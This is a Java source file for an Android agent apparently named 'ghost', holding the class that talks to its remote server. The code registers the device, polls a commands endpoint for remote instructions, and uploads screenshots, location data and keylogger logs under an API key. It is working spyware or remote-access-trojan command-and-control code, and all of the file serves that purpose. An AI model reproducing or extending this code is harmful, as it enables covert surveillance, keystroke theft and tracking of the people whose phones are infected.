package com.ghost.agent.core;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class NetworkManager {
    
    private static final String TAG = "NetworkManager";
    private static final int TIMEOUT = 30000;
    
    private Context context;
    private String serverUrl;
    private String apiKey;
    private String deviceId;
    
    public interface CommandCallback {
        void onSuccess(JSONObject response);
    }
    
    public NetworkManager(Context context, String serverUrl, String apiKey, String deviceId) {
        this.context = context;
        this.serverUrl = serverUrl;
        this.apiKey = apiKey;
        this.deviceId = deviceId;
    }
    
    public void registerDevice() {
        try {
            JSONObject data = new JSONObject();
            data.put("device_id", deviceId);
            data.put("device_name", Build.MODEL);
            data.put("manufacturer", Build.MANUFACTURER);
            data.put("model", Build.MODEL);
            data.put("android_version", Build.VERSION.RELEASE);
            data.put("sdk", Build.VERSION.SDK_INT);
            
            post("devices.php", data);
            
        } catch (Exception e) {
            Log.e(TAG, "Erreur enregistrement: " + e.getMessage());
        }
    }
    
    public void sendHeartbeat() {
        try {
            JSONObject data = new JSONObject();
            data.put("timestamp", System.currentTimeMillis());
            post("heartbeat.php?device_id=" + deviceId, data);
        } catch (Exception e) {
            Log.e(TAG, "Erreur heartbeat: " + e.getMessage());
        }
    }
    
    public void getCommands(CommandCallback callback) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "commands.php?device_id=" + 
                                 URLEncoder.encode(deviceId, "UTF-8"));
                
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty("X-API-Key", apiKey);
                conn.setConnectTimeout(TIMEOUT);
                conn.setReadTimeout(TIMEOUT);
                
                int code = conn.getResponseCode();
                if (code == 200) {
                    BufferedReader reader = new BufferedReader(
                        new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    reader.close();
                    
                    callback.onSuccess(new JSONObject(response.toString()));
                }
                conn.disconnect();
                
            } catch (Exception e) {
                Log.e(TAG, "Erreur getCommands: " + e.getMessage());
            }
        }).start();
    }
    
    public void sendScreenshot(String base64) {
        try {
            JSONObject data = new JSONObject();
            data.put("image", base64);
            data.put("timestamp", System.currentTimeMillis());
            post("upload.php?type=screenshot&device_id=" + deviceId, data);
        } catch (Exception e) {
            Log.e(TAG, "Erreur envoi screenshot: " + e.getMessage());
        }
    }
    
    public void sendLocation(JSONObject location) {
        try {
            post("upload.php?type=location&device_id=" + deviceId, location);
        } catch (Exception e) {
            Log.e(TAG, "Erreur envoi location: " + e.getMessage());
        }
    }
    
    public void sendKeyLogs(String logs) {
        try {
            JSONObject data = new JSONObject();
            data.put("logs", logs);
            post("upload.php?type=keylog&device_id=" + deviceId, data);
        } catch (Exception e) {
            Log.e(TAG, "Erreur envoi keylogs: " + e.getMessage());
        }
    }
    
    public void sendCommandResult(int commandId, JSONObject result) {
        try {
            post("commands.php?action=result&id=" + commandId + "&device_id=" + deviceId, result);
        } catch (Exception e) {
            Log.e(TAG, "Erreur envoi résultat: " + e.getMessage());
        }
    }
    
    private void post(String endpoint, JSONObject data) throws Exception {
        if (!isNetworkAvailable()) return;
        
        URL url = new URL(serverUrl + endpoint);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("X-API-Key", apiKey);
        conn.setDoOutput(true);
        conn.setConnectTimeout(TIMEOUT);
        conn.setReadTimeout(TIMEOUT);
        
        DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
        dos.writeBytes(data.toString());
        dos.flush();
        dos.close();
        
        int code = conn.getResponseCode();
        conn.disconnect();
    }
    
    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) 
            context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = cm.getActiveNetworkInfo();
        return info != null && info.isConnected();
    }
}
